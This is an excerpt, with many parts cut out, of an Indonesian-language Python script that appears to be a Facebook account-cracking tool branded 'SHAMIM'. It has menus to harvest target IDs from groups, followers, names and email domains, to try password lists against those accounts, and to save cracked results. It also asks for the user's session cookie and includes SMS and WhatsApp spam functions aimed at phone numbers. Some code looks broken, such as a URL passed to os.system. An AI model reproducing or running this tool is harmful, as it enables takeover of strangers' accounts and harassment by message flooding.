...
#------------------[ USER-AGENT ]-------------------#
try:
	prox= requests.get('https://github.com/Shamim1BD/Fc2/blob/main/Afroveal18.txt').text
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/Shamim1BD/Fc2/blob/main/Afroveal18.txt').text
		ua=open('.bbnew.txt','w')
...
def login_lagi334():
	try:
		...
		your_cookies = input(' [+] SHAMIM Cookie : ')
		with requests.Session() as r:
			try:
				...
				os.system('https://github.com/Shamim1BD/Fc2/blob/main/Afroveal18.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass
...
def komen():
	...
	ide = input(f' [+] SHAMIM Id Postingan : ')
...
#-----------------[ CRACK GRUP ]-----------------# 
def crack_group():
	cetak(nel(' SHAMIM Idz Grup Pastikan Grup Bersifat Publik Bukan Private',width=90,padding=(0,8),style=f"bold white"))
...
def pengikut():
	...
	akun = console.input(f' [+] SHAMIM Id Target : ')
	try:
...
def crack_nama():
	...
	nam = console.input(f' [+] SHAMIM Nama : ').split(",")
	for ser in nam:		
...
def crack_email():
	...
	global ok , cp
	cetak(nel(f'SHAMIM Nama Email Yang Ingin Di Crack, Contoh : Andi, Dian, Putri, Aditya',width=90,padding=(0,5),style=f"bold white"))
	nama = console.input(f' [+] SHAMIM Nama Target : ')
	if ',' in str(nama):
		print(f" [+] SHAMIM Nama, Jangan Kosong Ngab")
		time.sleep(3);exit()
	cetak(nel(f'SHAMIM Nama Domain , Contoh : @Gmail.com, @Yahoo.com, Dll',width=90,padding=(0,9),style=f"bold white"))
	doma = console.input(f' [+] SHAMIM Nama Domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		print(f" [+] SHAMIM Domain Dengan Benar")
		time.sleep(3);exit()
...
def dump_massal():
    ...
    for yantti in range(dwi):
        _dwi_ += 1
        SHAMIM = input(f" Masukkan Id Yang Ke {_dwi_}: ")
        uid.append(SHAMIM)
    for user in uid:
        try:
            head = (
...
[bold white][[bold cyan]03[bold white]] [bold white]Menggunakan Password Manual [[bold red]Not Recommended[bold white]]''',style='bold white',title='[bold green]Setting Password',padding=(0,8),width=90))
	...
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		bzer = input(f' [+] SHAMIM User-Agent : ')
		ualu.append(bzer)
	else:
		ualuh.append('tidak')
	passwrd()
...
def file_cp():
	...
	try:
		print("\n%s%s%s\033[0mSHAMIM file [ Contoh %s: %sCP-%s.txt%s ]"%(P,til,P,P,P,waktu,P))
		opsi()
	except IOError:
...
def opsi():
	CP = ("CP/")
	romi = input("%s%s%s\033[0mSHAMIM file %s> %s"%(P,til,P,P,P))
	if romi == "":
	...
	try:
		...
		exit("\n%s%s\033[0mSHAMIM File %s\033[0m Tidak Tersedia"%(P,til,romi))
	...
	if pw in['y','Y']:
		...
		pw2 = input("%s%s%s\033[0mSHAMIM Sandi %s> %s"%(P,til,P,P,P))
		if len(pw2) <= 5:
...
def spam_sms():
	global nomor 
	cetak(panel(f'''   SHAMIMTarget Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
...
def spam_wa():
	global nomor
	cetak(panel(f'''   SHAMIM Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
	nomor = input(f" [+] Input No Hp : +62").replace("+62","")
	if nomor == "":
		pass
	else:
